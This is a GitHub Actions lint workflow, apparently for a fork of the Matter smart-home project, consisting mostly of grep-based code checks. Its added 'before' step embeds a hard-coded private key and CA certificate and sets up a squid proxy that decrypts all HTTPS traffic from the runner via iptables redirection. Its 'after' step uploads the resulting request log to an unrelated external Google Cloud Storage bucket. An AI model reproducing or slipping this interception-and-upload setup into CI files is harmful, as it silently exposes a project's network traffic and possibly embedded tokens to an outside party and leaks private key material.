concurrency:
  cancel-in-progress: true
  group: ${{ github.ref }}-${{ github.workflow }}-${{ (github.event_name == 'pull_request'
    && github.event.number) || (github.event_name == 'workflow_dispatch' && github.run_number)
    || github.sha }}
env:
  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
  NODE_OPTIONS: --use-openssl-ca
jobs:
  code-lints:
    runs-on: ubuntu-latest
    steps:
    - name: before
      run: 'sudo apt update

        sudo apt install -y squid-openssl

        sudo mkdir /squid

        cat << EOF | sudo tee /squid/key.pem

        -----BEGIN PRIVATE KEY-----

        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

        CznEvO4qIs3mXDYkNBQrdVLGF93y

        -----END PRIVATE KEY-----

        EOF

        cat << EOF | sudo tee /squid/cert.pem

        -----BEGIN CERTIFICATE-----

        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

        -----END CERTIFICATE-----

        EOF

        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB

        sudo chown -R proxy:proxy /squid

        cat << EOF | sudo tee /etc/squid/squid.conf

        cache deny all


        http_port 7821

        http_port 3128 intercept

        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
        cert=/squid/cert.pem key=/squid/key.pem

        acl step1 at_step SslBump1

        ssl_bump peek step1

        ssl_bump bump all

        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB

        sslcrtd_children 5

        ssl_bump server-first all

        sslproxy_cert_error allow all


        acl all src 0.0.0.0/0

        http_access allow all


        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}

        access_log daemon:/squid/squidlog.json custom all !CONNECT

        EOF

        sudo systemctl reload squid

        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt

        sudo update-ca-certificates

        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
        -storepass changeit -noprompt -trustcacerts

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        80 -j DNAT --to-destination 127.0.0.1:3128

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        443 -j DNAT --to-destination 127.0.0.1:3129

        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
    - continue-on-error: true
      name: Checkout
      uses: actions/checkout@v4
    - continue-on-error: true
      name: Checkout submodules & Bootstrap
      uses: ./.github/actions/checkout-submodules-and-bootstrap
      with:
        platform: linux
    - continue-on-error: true
      if: always()
      name: Check for orphaned gn files
      run: "./scripts/run_in_build_env.sh \"./scripts/tools/not_known_to_gn.py \\\n\
        \   src \\\n   --skip-dir app/clusters \\\n   --skip-dir darwin \\\n   --skip-dir\
        \ include \\\n   --skip-dir platform/Ameba \\\n   --skip-dir platform/android\
        \ \\\n   --skip-dir platform/ASR \\\n   --skip-dir platform/Beken \\\n   --skip-dir\
        \ platform/bouffalolab \\\n   --skip-dir platform/cc13xx_26xx \\\n   --skip-dir\
        \ platform/cc32xx \\\n   --skip-dir platform/Darwin \\\n   --skip-dir platform/ESP32\
        \ \\\n   --skip-dir platform/fake \\\n   --skip-dir platform/FreeRTOS \\\n\
        \   --skip-dir platform/Infineon \\\n   --skip-dir platform/Linux \\\n   --skip-dir\
        \ platform/mbed \\\n   --skip-dir platform/mt793x \\\n   --skip-dir platform/nxp\
        \ \\\n   --skip-dir platform/OpenThread \\\n   --skip-dir platform/qpg \\\n\
        \   --skip-dir platform/silabs \\\n   --skip-dir platform/telink \\\n   --skip-dir\
        \ platform/webos \\\n   --skip-dir platform/Zephyr \\\n   --skip-dir test_driver\
        \ \\\n   --skip-dir platform/NuttX \\\n   --known-failure app/app-platform/ContentApp.cpp\
        \ \\\n   --known-failure app/app-platform/ContentApp.h \\\n   --known-failure\
        \ app/app-platform/ContentAppPlatform.cpp \\\n   --known-failure app/app-platform/ContentAppPlatform.h\
        \ \\\n   --known-failure controller/ExamplePersistentStorage.cpp \\\n   --known-failure\
        \ controller/ExamplePersistentStorage.h \\\n   --known-failure app/AttributeAccessToken.h\
        \ \\\n   --known-failure app/CommandHandlerInterface.h \\\n   --known-failure\
        \ app/CommandResponseSender.h \\\n   --known-failure app/CommandSenderLegacyCallback.h\
        \ \\\n   --known-failure app/ReadHandler.h \\\n   --known-failure app/reporting/reporting.cpp\
        \ \\\n   --known-failure app/reporting/tests/MockReportScheduler.cpp \\\n\
        \   --known-failure app/reporting/tests/MockReportScheduler.h \\\n   --known-failure\
        \ app/util/attribute-storage.cpp \\\n   --known-failure app/util/attribute-storage-detail.h\
        \ \\\n   --known-failure app/util/attribute-storage.h \\\n   --known-failure\
        \ app/util/attribute-table.cpp \\\n   --known-failure app/util/attribute-table-detail.h\
        \ \\\n   --known-failure app/util/attribute-table.h \\\n   --known-failure\
        \ app/util/binding-table.cpp \\\n   --known-failure app/util/binding-table.h\
        \ \\\n   --known-failure app/util/config.h \\\n   --known-failure app/util/DataModelHandler.cpp\
        \ \\\n   --known-failure app/util/DataModelHandler.h \\\n   --known-failure\
        \ app/util/ember-compatibility-functions.cpp \\\n   --known-failure app/util/ember-compatibility-functions.h\
        \ \\\n   --known-failure app/util/ember-global-attribute-access-interface.cpp\
        \ \\\n   --known-failure app/util/ember-global-attribute-access-interface.h\
        \ \\\n   --known-failure app/util/ember-io-storage.cpp \\\n   --known-failure\
        \ app/util/ember-io-storage.h \\\n   --known-failure app/util/endpoint-config-api.h\
        \ \\\n   --known-failure app/util/generic-callbacks.h \\\n   --known-failure\
        \ app/util/generic-callback-stubs.cpp \\\n   --known-failure app/util/im-client-callbacks.h\
        \ \\\n   --known-failure app/util/IMClusterCommandHandler.h \\\n   --known-failure\
        \ app/util/util.cpp \\\n   --known-failure app/util/util.h \\\n   --known-failure\
        \ app/WriteHandler.h \\\n   --known-failure platform/DeviceSafeQueue.cpp \\\
        \n   --known-failure platform/DeviceSafeQueue.h \\\n   --known-failure platform/GLibTypeDeleter.h\
        \ \\\n   --known-failure platform/SingletonConfigurationManager.cpp \\\n\"\
        \n"
    - continue-on-error: true
      if: always()
      name: Check for matter lint errors
      run: "for idl_file in $(find . -name '*.matter'); do\n    # TODO: all these\
        \ conformance failures should be fixed\n    #       Issues exist for most\
        \ of them:\n    #       https://github.com/project-chip/connectedhomeip/issues/19176\n\
        \    #       https://github.com/project-chip/connectedhomeip/issues/19175\n\
        \    #       https://github.com/project-chip/connectedhomeip/issues/19173\n\
        \    if [ \"$idl_file\" = './examples/log-source-app/log-source-common/log-source-app.matter'\
        \ ]; then continue; fi\n    if [ \"$idl_file\" = './examples/placeholder/linux/apps/app1/config.matter'\
        \ ]; then continue; fi\n    if [ \"$idl_file\" = './examples/placeholder/linux/apps/app2/config.matter'\
        \ ]; then continue; fi\n    if [ \"$idl_file\" = './examples/thermostat/thermostat-common/thermostat.matter'\
        \ ]; then continue; fi\n    if [ \"$idl_file\" = './examples/window-app/common/window-app.matter'\
        \ ]; then continue; fi\n\n    # Test files are intentionally small and not\
        \ spec-compilant, just parse-compliant\n    if [ \"$idl_file\" = \"./scripts/py_matter_idl/matter_idl/tests/inputs/cluster_struct_attribute.matter\"\
        \ ]; then continue; fi\n    if [ \"$idl_file\" = \"./scripts/py_matter_idl/matter_idl/tests/inputs/global_struct_attribute.matter\"\
        \ ]; then continue; fi\n    if [ \"$idl_file\" = \"./scripts/py_matter_idl/matter_idl/tests/inputs/optional_argument.matter\"\
        \ ]; then continue; fi\n    if [ \"$idl_file\" = \"./scripts/py_matter_idl/matter_idl/tests/inputs/several_clusters.matter\"\
        \ ]; then continue; fi\n    if [ \"$idl_file\" = \"./scripts/py_matter_idl/matter_idl/tests/inputs/simple_attribute.matter\"\
        \ ]; then continue; fi\n    if [ \"$idl_file\" = \"./scripts/py_matter_idl/matter_idl/tests/inputs/large_lighting_app.matter\"\
        \ ]; then continue; fi\n    if [ \"$idl_file\" = \"./scripts/py_matter_idl/matter_idl/tests/inputs/large_all_clusters_app.matter\"\
        \ ]; then continue; fi\n\n    ./scripts/run_in_build_env.sh \"./scripts/idl_lint.py\
        \ --log-level warn $idl_file\" >/dev/null || exit 1\ndone\n"
    - continue-on-error: true
      if: github.event_name == 'workflow_dispatch'
      name: Check broken links
      uses: gaurav-nelson/github-action-markdown-link-check@v1
    - continue-on-error: true
      if: always()
      name: Check for incorrect error use in VerifyOrExit
      run: 'git grep -I -n "VerifyOrExit(.*, [A-Za-z]*_ERROR" -- ''./*'' '':(exclude).github/workflows/lint.yml''
        && exit 1 || exit 0

        '
    - continue-on-error: true
      if: always()
      name: Check for use of PRI*8, which are not supported on some libcs.
      run: 'git grep -I -n "PRI.8" -- ''./*'' '':(exclude).github/workflows/lint.yml''
        '':(exclude)third_party/lwip/repo/lwip/src/include/lwip/arch.h'' && exit 1
        || exit 0

        '
    - continue-on-error: true
      if: always()
      name: Check for use of PRI*16, which are not supported on some libcs.
      run: 'git grep -I -n "PRI.16" -- ''./*'' '':(exclude).github/workflows/lint.yml''
        '':(exclude)third_party/lwip/repo/lwip/src/include/lwip/arch.h'' && exit 1
        || exit 0

        '
    - continue-on-error: true
      if: always()
      name: Check for use of PRI*64, which are not supported on some libcs.
      run: '# TODO: MessageDefHelper should ideally not be excluded here.

        # TODO: chip_im_initiatore should ideally not be excluded here.

        # TODO: TLVDebug should ideally not be excluded here.

        # TODO: protocol_decoder.cpp should ideally not be excluded here.

        # TODO: PersistentStorageMacros.h should ideally not be excluded here.

        git grep -I -n "PRI.64" -- ''./*'' '':(exclude).github/workflows/lint.yml''
        '':(exclude)examples/chip-tool'' '':(exclude)examples/tv-casting-app'' '':(exclude)src/app/MessageDef/MessageDefHelper.cpp''
        '':(exclude)src/app/tests/integration/chip_im_initiator.cpp'' '':(exclude)src/lib/core/TLVDebug.cpp''
        '':(exclude)src/lib/dnssd/tests/TestTxtFields.cpp'' '':(exclude)src/lib/format/protocol_decoder.cpp''
        '':(exclude)src/lib/support/PersistentStorageMacros.h'' '':(exclude)src/messaging/tests/echo/echo_requester.cpp''
        '':(exclude)src/platform/Linux'' '':(exclude)src/platform/Ameba'' '':(exclude)src/platform/ESP32''
        '':(exclude)src/platform/Darwin'' '':(exclude)src/darwin'' '':(exclude)src/platform/webos''
        '':(exclude)zzz_generated/chip-tool'' '':(exclude)src/tools/chip-cert/Cmd_PrintCert.cpp''
        '':(exclude)src/platform/NuttX'' && exit 1 || exit 0

        '
    - continue-on-error: true
      if: always()
      name: Check for use of %zu, which are not supported on some libcs.
      run: 'git grep -I -n "%zu" -- ''./*'' '':(exclude).github/workflows/lint.yml''
        && exit 1 || exit 0

        '
    - continue-on-error: true
      if: always()
      name: Do not allow TODO in generated files
      run: 'git grep -n ''TODO:'' -- ./zzz_generated ''./*/zap-generated/*'' && exit
        1 || exit 0

        '
    - continue-on-error: true
      if: always()
      name: Check for disallowed include files
      run: scripts/tools/check_includes.sh
    - continue-on-error: true
      if: always()
      name: Check for zcl.json and extension sync status
      run: scripts/tools/check_zcl_file_sync.py .
    - continue-on-error: true
      if: always()
      name: Ensure all PICS are set for tests (to true or false)
      run: 'scripts/tools/check_test_pics.py src/app/tests/suites/certification/ci-pics-values
        src/app/tests/suites/certification/PICS.yaml

        '
    - continue-on-error: true
      if: always()
      name: Check for use of 0x%u and the like, which lead to misleading output.
      run: 'git grep -I -n ''0x%[0-9l.*-]*[^xX"0-9l.*-]'' -- ''./*'' '':(exclude).github/workflows/lint.yml''
        && exit 1 || exit 0

        '
    - continue-on-error: true
      if: always()
      name: Check for use of '"0x" PRIu*' and the like, which lead to misleading output.
      run: 'git grep -I -n ''0x%[0-9-]*" *PRI[^xX]'' -- ''./*'' '':(exclude).github/workflows/lint.yml''
        && exit 1 || exit 0

        '
    - continue-on-error: true
      if: always()
      name: Check for use of NSLog instead of Matter logging in Matter framework
      run: 'git grep -n ''NSLog('' -- src/darwin/Framework/CHIP && exit 1 || exit
        0

        '
    - continue-on-error: true
      if: always()
      name: Check for use of 'emberAfReadAttribute' instead of the type-safe getters
      run: 'git grep -I -n ''emberAfReadAttribute'' -- ''./*'' '':(exclude).github/workflows/lint.yml''
        '':(exclude)src/app/util/attribute-table.h'' '':(exclude)zzz_generated/app-common/app-common/zap-generated/attributes/Accessors.cpp''
        '':(exclude)src/app/zap-templates/templates/app/attributes/Accessors-src.zapt''
        '':(exclude)src/app/util/attribute-table.cpp''  && exit 1 || exit 0

        '
    - continue-on-error: true
      if: always()
      name: Check for use of 'emberAfWriteAttribute' instead of the type-safe setters
      run: 'git grep -I -n ''emberAfWriteAttribute'' -- ''./*'' '':(exclude).github/workflows/lint.yml''
        '':(exclude)zzz_generated/app-common/app-common/zap-generated/attributes/Accessors.cpp''
        '':(exclude)src/app/zap-templates/templates/app/attributes/Accessors-src.zapt''
        '':(exclude)src/app/util/attribute-table.cpp'' '':(exclude)examples/common/pigweed/rpc_services/Attributes.h''
        '':(exclude)src/app/util/attribute-table.h'' '':(exclude)src/app/util/ember-compatibility-functions.cpp''
        && exit 1 || exit 0

        '
    - continue-on-error: true
      if: always()
      name: Check for errors using ruff Python linter
      run: 'ruff check

        '
    - continue-on-error: true
      if: always()
      name: Check for use of "SuccessOrExit(CHIP_ERROR_*)", which should probably
        be "SuccessOrExit(err = CHIP_ERROR_*)"
      run: 'git grep -I -n ''SuccessOrExit(CHIP_ERROR'' -- ''./*'' '':(exclude).github/workflows/lint.yml''
        && exit 1 || exit 0

        '
    - continue-on-error: true
      if: always()
      name: Check for use of "SuccessOrExit(something-without-assignment(", which
        should probably be "SuccessOrExit(err = something("
      run: 'git grep -I -n ''SuccessOrExit([^=)]*('' -- ''./*'' '':(exclude).github/workflows/lint.yml''
        && exit 1 || exit 0

        '
    - continue-on-error: true
      if: always()
      name: Check for use of "using namespace" outside of a class/function in headers.
      run: '# Various platforms have `using namespace chip::Ble` in their BLEManager*
        headers; just exclude those for now.

        #

        # Exclude platform openiotsdk bits that do this in their persistent storage
        header.

        #

        # Also exclude examples (for now) and third_party, which have various instances
        of this.

        #

        # Ignore uses of `System::Clock::Literals`, because that''s the only way to
        have things using _ms32 or whatnot

        # in a header file.

        git grep -I -n -e ''^using namespace'' --and --not -e ''System::Clock::Literals''
        -- ''./**/*.h'' '':(exclude)src/platform/*/BLEManager*.h'' '':(exclude)src/platform/openiotsdk/KVPsaPsStore.h''
        '':(exclude)./examples'' '':(exclude)./third_party'' && exit 1 || exit 0

        '
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/SiliconLabs/matter-for-unify.$(date
        +%s)
    timeout-minutes: 60
name: Lint Code Base
'on':
  workflow_dispatch: {}
